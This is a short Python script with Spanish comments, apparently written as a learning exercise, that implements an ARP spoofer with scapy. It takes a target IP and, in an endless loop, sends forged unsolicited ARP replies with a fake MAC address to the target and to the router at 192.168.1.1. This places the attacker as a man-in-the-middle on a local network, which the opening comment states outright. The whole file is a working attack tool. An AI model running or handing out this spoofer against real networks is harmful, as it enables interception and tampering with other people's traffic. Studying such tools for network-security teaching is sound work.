#!/usr/bin/env python3
import argparse
import time
import sys
import scapy.all as scapy
import signal # para manejar señales de teclado
from termcolor import colored # para poner colores en la terminal

# Con este script puedes ejecutar un MiTM colocándote entre el router y la máquina víctima

def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
    print(colored(f"\n[!] Saliendo del programa...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl+C

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to spoof")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") # si pones 2 estás enviando una respuesta que no ha sido solicitada
    scapy.send(arp_packet, verbose=False) # no quiero recibir nada, solo tramitar el paquete concreto a su destino, por eso se usa send()

def main():
    arguments = get_arguments()

    while True: # hay que hacerlo continuamente porque en la red los dispositivos se comunican constantemente
        spoof(arguments.ip_address, "192.168.1.1") # la que se le envía a la máquina víctima
        spoof("192.168.1.1", arguments.ip_address) # la que se le envía al router haciéndose pasar por la máquina víctima
        time.sleep(2)

if __name__ == '__main__':
    main()